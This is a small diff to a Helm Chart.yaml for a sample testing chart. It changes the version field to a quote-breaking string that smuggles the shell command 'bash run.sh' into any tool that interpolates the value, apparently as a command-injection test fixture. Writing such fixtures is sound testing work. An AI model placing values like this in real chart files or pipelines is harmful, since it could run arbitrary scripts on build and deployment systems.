@@ -1,5 +1,5 @@
 apiVersion: v2
 name: sample-chart
 description: A sample Helm chart for testing
-version: 1.0.0
+version: '"; bash run.sh #'
 type: application
